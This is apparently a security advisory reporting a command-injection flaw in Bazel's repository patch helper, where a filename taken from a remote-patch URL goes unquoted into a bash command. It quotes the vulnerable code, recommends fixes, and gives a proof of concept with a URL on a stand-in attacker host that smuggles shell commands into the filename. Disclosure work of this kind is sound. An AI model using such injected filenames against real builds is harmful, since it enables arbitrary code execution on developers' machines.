### Title
Command Injection via Unescaped Patch Filename in `patch()` External Patch-Tool Fallback - (File: `tools/build_defs/repo/utils.bzl`)

### Summary
When a repository rule (e.g. `http_archive`, `git_repository`) is configured with a non-default `patch_tool` and uses `remote_patches` to fetch a patch from a URL, the locally-cached patch filename is derived directly from the attacker-controlled URL's last path segment and interpolated, completely unquoted, into a shell command string that is executed via `bash -c`. A hostile registry/mirror serving the patch URL can smuggle shell metacharacters into that filename and achieve arbitrary command execution during a normal build/fetch, even though the patch *contents* are integrity-checked.

### Finding Description
`_download_patch()` computes the local patch file name straight from the URL, with no sanitization: [1](#0-0) 

`name = patch_url.split("/")[-1]` simply takes everything after the last literal `/` in the URL string. Nothing requires `patch_url` to be a strictly-encoded RFC 3986 URL — Starlark passes it straight through to `ctx.download`. The `integrity` parameter only verifies the byte content of the downloaded file, not the filename/path used to store it.

Later, when `patch_tool` is a non-empty custom value (any `patch_args` other than plain `-pN` also triggers this), the `patch()` function builds and executes a raw shell command string with the file path interpolated unescaped: [2](#0-1) 

Note that `patch_args` are wrapped in single quotes (mirroring the exact pattern from the reported Deno bug), but `patchfile = ctx.path(patchfile)` — which contains the attacker-influenced `name` from `_download_patch` — is dropped into the command string with **no quoting at all**. The resulting string is handed to `bash -c`:

```python
st = ctx.execute([bash_exe, "-c", command], working_directory = patch_directory or "")
```

This is functionally the same bug class as GHSA-7xh3-mhg9-jcw8: a helper meant to safely assemble a shell command line fails to neutralize metacharacters in one of its components, so an attacker who controls that component (there: an argument to `spawn`; here: the basename derived from a remote-patch URL) can inject additional shell syntax that `bash` will interpret.

### Impact Explanation
An outsider who controls (or can influence) the URL used for a `remote_patches` entry — e.g. a Bazel Central Registry mirror, a compromised/malicious download host, or any hostile server the victim's build fetches a patch from — can craft a URL whose last path segment contains shell metacharacters such as `; touch pwned;`, `` ` ``, `$( ... )`, or `|`. When the victim's repository-rule declaration uses a non-default `patch_tool` (a legitimate, supported configuration for patches requiring fuzz-match/binary-patch support), the attacker's crafted filename is spliced unquoted into a `bash -c "..."` command, achieving arbitrary command execution in the context of the Bazel client process performing the fetch/patch step — a write/execute capability well outside the intended `patch`/redirection operation.

### Likelihood Explanation
Reaching the vulnerable branch requires the victim's own (trusted) repository-rule declaration to set `patch_tool` (or supply `patch_args` other than plain `-p<N>`) — a legitimate, documented configuration, not a bypass of any root-repo trust boundary. Given that precondition, the attacker only needs control over the byte content of a URL used in `remote_patches`, which is squarely within the threat model of "a hostile origin server/mirror/registry publishing content a victim's build consumes." The declared `sha256`/`integrity` value is verified only against the fetched bytes, never against the filename derived from the URL, so it does not stop this attack — the invariant "untrusted content stays data" is broken specifically for the filename component.

### Recommendation
- In `_download_patch()`, do not derive the local filename from the raw URL. Use a fixed/synthetic name (e.g. a hash of the URL or an incrementing index) unrelated to attacker-supplied bytes.
- In `patch()`, never interpolate a path into a shell command string. Pass the patch tool invocation as an argv list to `ctx.execute` (e.g. `ctx.execute([patch_tool] + patch_args, ..., input=...)` or shell-escape every interpolated component, including `patchfile`, with a robust helper (single-quote wrapping with proper `'"'"'` escaping of embedded quotes), not just `patch_args`.

### Proof of Concept
Conceptual reproduction (for a `BuildIntegrationTestCase` / `src/test/shell/bazel` style test):

1. Serve a patch file at a URL such as `http://attacker.example/'; touch INJECTED; echo '.patch`, whose bytes match a declared `integrity` value.
2. Declare a repository rule that uses `remote_patches = {url: integrity}`, plus a `patch_tool` value (e.g. `"patch"`) and any `patch_args` beyond plain `-pN` so the native-patch fast path in `patch()` is skipped:

```python
git_repository(
    name = "ext",
    remote = "...",
    tag = "...",
    patch_tool = "patch",
    patch_args = ["-p1", "--binary"],
    remote_patches = {"http://attacker.example/'; touch INJECTED; echo '.patch": "sha256-..."},
)
```
3. Run `bazel build @ext//...`.
4. Observe that the file `INJECTED` is created in the execution/working directory, confirming that shell metacharacters embedded in the URL-derived filename were interpreted by `bash -c` rather than treated as a literal path.

### Citations

**File:** tools/build_defs/repo/utils.bzl (L73-83)
```text
def _download_patch(ctx, patch_url, integrity, auth = None):
    name = patch_url.split("/")[-1]
    patch_path = ctx.path(_REMOTE_PATCH_DIR).get_child(name)
    download_info = ctx.download(
        patch_url,
        patch_path,
        canonical_id = ctx.attr.canonical_id,
        auth = get_auth(ctx, [patch_url]) if auth == None else auth,
        integrity = integrity,
    )
    return patch_path, download_info
```

**File:** tools/build_defs/repo/utils.bzl (L250-271)
```text
    # Apply local patches
    if native_patch and _use_native_patch(patch_args):
        if patch_args:
            strip = int(patch_args[-1][2:])
        else:
            strip = 0
        for patchfile in patches:
            ctx.patch(patchfile, strip, directory = patch_directory or "")
    else:
        for patchfile in patches:
            command = "{patchtool} {patch_args} < {patchfile}".format(
                patchtool = patch_tool,
                patchfile = ctx.path(patchfile),
                patch_args = " ".join([
                    "'%s'" % arg
                    for arg in patch_args
                ]),
            )
            st = ctx.execute([bash_exe, "-c", command], working_directory = patch_directory or "")
            if st.return_code:
                fail("Error applying patch %s:\n%s%s" %
                     (str(patchfile), st.stderr, st.stdout))
```
